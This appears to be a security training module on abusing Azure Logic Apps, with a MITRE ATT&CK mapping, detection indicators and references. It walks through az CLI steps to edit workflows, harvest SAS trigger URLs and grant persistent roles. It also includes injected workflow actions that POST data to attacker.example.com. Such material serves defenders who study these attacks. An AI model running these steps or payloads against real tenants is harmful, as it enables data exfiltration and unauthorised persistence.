# Attack - Module 03 (Logic App Abuse)

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Valid Accounts: Cloud Accounts | T1078.004 | Initial Access / Persistence / Defense Evasion |
| Account Manipulation | T1098 | Persistence |
| Transfer Data to Cloud Account | T1537 | Exfiltration |
| Exfiltration Over Web Service | T1567 | Exfiltration |

---

## Attack Vector 1 — RBAC Abuse to Edit Workflow Definitions

### Why This Works

Logic App workflows are stored as JSON definitions. Any identity with **Logic App Contributor** or **Contributor** RBAC on the resource group can read and overwrite that JSON definition via the Azure portal, CLI, or REST API. There is no change-approval gate by default — a successful `Microsoft.Logic/workflows/write` operation takes effect immediately.

### Built-in Roles That Grant Workflow Write

| Role | `Microsoft.Logic/workflows/write` | Notes |
|---|---|---|
| Owner | ✅ | Full control |
| Contributor | ✅ | Manages all resources; most common misconfiguration |
| Logic App Contributor | ✅ | Scoped to Logic Apps only |
| Logic App Operator | ❌ | Can enable/disable only; cannot edit definitions |

### Adversary Steps

1. **Enumerate Logic Apps in a subscription or resource group:**
   ```bash
   az logic workflow list --resource-group <rg-name> --output table
   ```

2. **Download the existing workflow definition:**
   ```bash
   az logic workflow show \
     --resource-group <rg-name> \
     --name <workflow-name> \
     --query "definition" > workflow.json
   ```

3. **Edit the workflow JSON** to inject a new HTTP action that POSTs sensitive payload to an attacker-controlled endpoint. Example injected action block:
   ```json
   "Exfil_Action": {
     "type": "Http",
     "inputs": {
       "method": "POST",
       "uri": "https://attacker.example.com/collect",
       "body": "@{triggerOutputs()}"
     },
     "runAfter": {}
   }
   ```

4. **Upload the modified definition:**
   ```bash
   az logic workflow update \
     --resource-group <rg-name> \
     --name <workflow-name> \
     --definition @workflow.json
   ```
   This generates a `Microsoft.Logic/workflows/write` event in AzureActivity.

5. **Grant a self-controlled identity Logic App Contributor** on the resource (privilege persistence):
   ```bash
   az role assignment create \
     --assignee <attacker-principal-id> \
     --role "Logic App Contributor" \
     --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<name>
   ```

---

## Attack Vector 2 — Harvesting Trigger URLs (SAS-Signed Callback URLs)

### Why This Works

HTTP-triggered Logic Apps use a **Shared Access Signature (SAS)** URL as the trigger endpoint. This URL contains a `sig=` parameter that acts as a bearer secret — anyone with the URL can invoke the workflow without any Azure credentials. The URL can be retrieved from the portal or CLI by any identity with `Microsoft.Logic/workflows/triggers/listCallbackUrl/action` permission (granted by Logic App Contributor and above).

### Adversary Steps

1. **List all triggers on a workflow:**
   ```bash
   az logic workflow trigger list \
     --resource-group <rg-name> \
     --workflow-name <workflow-name>
   ```

2. **Retrieve the SAS-signed callback URL:**
   ```bash
   az logic workflow trigger show-callback-url \
     --resource-group <rg-name> \
     --workflow-name <workflow-name> \
     --trigger-name "manual"
   ```
   Example output:
   ```
   https://prod-xx.eastus.logic.azure.com/workflows/<id>/triggers/manual/paths/invoke?
   api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=<SAS_TOKEN>
   ```

3. **Invoke the workflow externally** using the harvested URL (no Azure authentication required):
   ```bash
   curl -X POST "https://prod-xx.eastus.logic.azure.com/...&sig=<SAS_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"command":"exfil"}'
   ```

4. **Abuse the trigger in phishing/initial access** — embed the trigger URL in a document macro or web page to silently invoke a data-collecting workflow from a victim's machine.

---

## Attack Vector 3 — Managed Identity Abuse for Sensitive File Exfiltration

### Why This Works

Logic Apps frequently run with a **system-assigned or user-assigned managed identity** that has been granted permissions to resources like SharePoint, Azure Blob Storage, Key Vault, or Microsoft Graph. An attacker who can edit the workflow definition can redirect those managed identity calls to enumerate and exfiltrate sensitive files — without ever needing the identity's credential material.

### Common Permissions Abused

| Target Resource | Common Managed Identity Permission | What Attacker Can Access |
|---|---|---|
| Azure Blob Storage | Storage Blob Data Reader / Contributor | List and download all blobs |
| SharePoint / OneDrive | Sites.Read.All (Graph) | Download files from SharePoint libraries |
| Azure Key Vault | Key Vault Secrets User | Read secrets and connection strings |
| Microsoft Graph | Mail.Read | Read mailbox contents |

### Adversary Steps

1. **Check the managed identity permissions:**
   ```bash
   az role assignment list \
     --assignee <managed-identity-principal-id> \
     --all \
     --output table
   ```

2. **Add a blob enumeration + exfiltration action** to the workflow:
   ```json
   "List_Blobs": {
     "type": "ApiConnection",
     "inputs": {
       "host": {"connection": {"name": "@parameters('$connections')['azureblob']['connectionId']"}},
       "method": "get",
       "path": "/datasets/default/foldersV2/%2F"
     }
   },
   "Exfil_Blob_List": {
     "type": "Http",
     "inputs": {
       "method": "POST",
       "uri": "https://attacker.example.com/collect",
       "body": "@body('List_Blobs')"
     },
     "runAfter": {"List_Blobs": ["Succeeded"]}
   }
   ```

3. **Trigger the modified workflow** using the harvested SAS URL or by manually running it via the portal/CLI.

---

## Typical Adversary Sequence

1. Compromise Azure credentials with Contributor or Logic App Contributor on a resource group.
2. Enumerate Logic Apps and their managed identity role assignments.
3. Download and modify a high-value workflow definition (one with blob/Graph/Key Vault connectors).
4. Inject an HTTP exfiltration action that forwards workflow outputs to an attacker endpoint.
5. Retrieve the trigger SAS URL for persistent, credential-free invocation.
6. Assign self-controlled service principal Logic App Contributor for long-term persistence.

---

## High-Signal Indicators

| Indicator | Source |
|---|---|
| `Microsoft.Logic/workflows/write` by a non-automation identity | AzureActivity |
| `Microsoft.Logic/workflows/triggers/listCallbackUrl/action` | AzureActivity |
| `Microsoft.Authorization/roleAssignments/write` scoped to a Logic App | AzureActivity |
| New external HTTP endpoint in workflow definition | Manual review / Logic App audit |
| Managed identity granted unexpectedly broad Graph or Storage permissions | Azure AD audit logs |

---

## Microsoft Learn References

- Secure access and data for workflows in Azure Logic Apps: https://learn.microsoft.com/azure/logic-apps/logic-apps-securing-a-logic-app
- Authenticate with managed identity in Logic Apps: https://learn.microsoft.com/azure/logic-apps/authenticate-with-managed-identity
- Azure Logic Apps built-in RBAC roles: https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#logic-app-contributor
- Microsoft.Logic resource provider operations: https://learn.microsoft.com/azure/role-based-access-control/permissions/integration#microsoftlogic
